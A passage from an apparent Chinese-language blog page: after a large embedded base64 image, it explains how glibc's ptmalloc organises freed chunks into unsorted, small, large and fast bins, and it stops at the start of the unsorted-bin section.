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BRRQQAEFRidQRYz0kY985IgjjnjOc56z+eab77nnnueee273/tx0001HHXUUL9peY401eOP2/Pnz77vvvtYsd95553777Ueya6+9tvVb5kQhn/zkJ4vf8oa6yHXxxRcz/7bbbuN13ttuu23WRbHF9FNOUw6dohm0s5iYNkcDNtxww2WWWYZ/3/jGNy5atKiYxmkFFFBAAQUUUEABBRSom8Bo3/1NSEAEsnDhwuw28Q9BxUknnXTppZe2fY82kcaxxx6b6XnjNn+//e1vTz311JwZExT+6U9/mulvf/vb2223XelbPvItIdBmm232mte8Jr8lRopc1L7bbrsR3tCk+DbqOvPMMy+66KJtttkms3SZIAsR1wMPPECaUncOOOCACMMiO63lj3CRjlNvlzL9SgEFFFBAAQUUUEABBcYoMMIYidiD6zMRP9DDLbfcctasWREvES1wUYVoodhzUhKxRFxBvMEfl3RISZoPfvCD73rXu1ZfffVi+gGnozoaWaqLSrkodOutt05ZHSlpcHSQsOfDH/5wNmnBggXRkXnz5q299trMv/3225lDhIaAMVJCOaGAAgoooIACCiigQN0ERhgjcX9dxA8EIVdddRX/0nniCi4inXbaafFVkYOvIq444YQTjjzyyPiKCzURh5Cr9VJSMft0p+Nq0i677HLFFVeU6qJtvVT3gQ98IAMkLj0tu+yy2QbusmOamXPnzs2ZBFFcR9pggw1yjhMKKKCAAgoooIACCihQN4FRPY9EtMO1FHq70kor3XjjjREg8ZGLM4Q61113HdeF2lqcc845GSCRgEsuhExMEF20TT/gzPe///1ZQtbVS3XcxXf22WeTklylAImZXJ4iZCoGSMxkzuGHH+5FJCj8U0ABBRRQQAEFFFCgtgKjipFOP/306DM3mxEmlfrP0z6toQIhBAES6UuJDznkEOZwxYYb1UpfDfIxquNppWIhUdeU1dESrm7xb9sAKQqkwVwZKxbutAIKKKCAAgoooIACCtRfYCQxEuFBvqdhn3326VGBS0ytARJ5CWZWWGEFJoYbcrStjrryMaRO1dE73rbHlaL11luv9QpSdDZCL95XQeIeu28yBRRQQAEFFFBAAQUUqIPASGIkoouMDYby+A0vewCrU9AyXEfCpCiwbXX0iytIEQEeffTRmbjUhrg/kIep1llnnRNPPLFtUaUs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AgQIECBwJaCRrt7pGAIECBAgQIAAAQIEooBGioDmBAgQIECAAAECBAhcCWikq3c6hgABAgQIECBAgACBKKCRIqA5AQIECBAgQIAAAQJXAhrp6p2OIUCAAAECBAgQIEAgCmikCGhOgAABAgQIECBAgMCVgEa6eqdjCBAgQIAAAQIECBCIAhopApoTIECAAAECBAgQIHAloJGu3ukYAgQIECBAgAABAgSigEaKgOYECBAgQIAAAQIECFwJaKSrdzqGAAECBAgQIECAAIEooJEioDkBAgQIECBAgAABAlcCGunqnY4hQIAAAQIECBAgQCAKaKQIaE6AAAECBAgQIECAwJWARrp6p2MIECBAgAABAgQIEIgCGikCmhMgQIAAAQIECBAgcCWgka7e6RgCBAgQIECAAAECBKKARoqA5gQIECBAgAABAgQIXAlopKt3OoYAAQIECBAgQIAAgSigkSKgOQECBAgQIECAAAECVwIa6eqdjiFAgAABAgQIECBAIApopAhoToAAAQIECBAgQIDAlYBGunqnYwgQIECAAAECBAgQiAIaKQKaEyBAgAABAgQIECBwJaCRrt7pGAIECBAgQIAAAQIEooBGioDmBAgQIECAAAECBAhcCWikq3c6hgABAgQIECBAgACBKKCRIqA5AQIECBAgQIAAAQJXAgOi1vYz4oDKwwAAAABJRU5ErkJggg==" alt="avatar"></p><h4 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h4><ul><li>数组中的第一个为unsorted bin，</li><li>数组中从2开始编号的前64个bin称为small bins<ul><li>同一个small bin中的chunk具有相同的大小。</li><li>两个相邻的small bin中的chunk大小相差8bytes。</li><li>small bins中的chunk按照最近使用顺序进行排列，最后释放的chunk被链接到链表的头部，而申请chunk是从链表尾部开始，这样，每一个chunk 都有相同的机会被ptmalloc选中。</li><li>Small bins后面的bin被称作large bins。large bins中的每一个bin分别包含了一个给定范围内的chunk，其中的chunk按大小序排列。相同大小的chunk同样按照最近使用顺序排列。</li><li>ptmalloc使用“smallest-first，best-fit”原则在空闲large bins中查找合适的chunk。</li></ul></li><li>当空闲的chunk被链接到bin中的时候，ptmalloc会把表示该chunk是否处于使用中的标志P设为0（注意，这个标志实际上处在下一个chunk中）同时ptmalloc还会检查它前后的chunk是否也是空闲的，如果是的话，ptmalloc会首先把它们合并为一个大的chunk，然后将合并后的chunk放到unstored bin中。</li><li>要注意的是，并不是所有的chunk被释放后就立即被放到bin中。</li><li>ptmalloc为了提高分配的速度，会把一些小的的chunk先放到一个叫做fast bins的容器内。</li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><ul><li>程序在运行时会经常需要申请和释放一些较小的内存空间。当分配器合并了相邻的几个小的chunk之后，也许马上就会有另一个小块内存的请求，这样分配器又需要从大的空闲内存中切分出一块，这样无疑是比较低效的，故而，ptmalloc中在分配过程中引入了fast bins，不大于max_fast （默认值为64B）的chunk被释放后，首先会被放到fast bins </li><li>fast bins中的chunk并不改变它的使用标志P。这样也就无法将它们合并</li><li>当需要给用户分配的chunk小于或等于max_fast时，ptmalloc首先会在fast bins中查找相应的空闲块，然后才会去查找bins中的空闲chunk。</li><li>在某个特定的时候，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。</li></ul><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted 